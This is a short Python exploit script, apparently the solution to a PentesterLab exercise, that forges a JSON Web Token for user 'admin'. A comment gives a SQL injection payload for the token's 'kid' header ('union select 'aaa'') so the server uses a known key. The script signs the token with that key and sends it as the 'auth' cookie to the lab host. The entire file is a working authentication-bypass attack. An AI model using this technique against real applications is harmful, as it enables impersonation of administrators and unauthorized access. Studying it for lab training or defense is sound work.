import hmac
import base64
import hashlib
import json
import requests

# input sql injection in kid `zzzzzz' union select 'aaa`
kid = input('kid: ')
url = 'http://ptl-b4e013c6-f71d5eff.libcurl.so/'
secret = "aaa"
header = {"typ":"JWT","alg":"HS256","kid":kid}
payload = {"user":"admin"}

data = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('UTF-8').rstrip("=") + '.' \
    + base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('UTF-8').rstrip("=")

sig = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding='utf8'),data.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

jwt = data + '.' + sig
print(jwt)
cookies = {"auth" : jwt}
r = requests.get(url, cookies=cookies)
print(r.text)
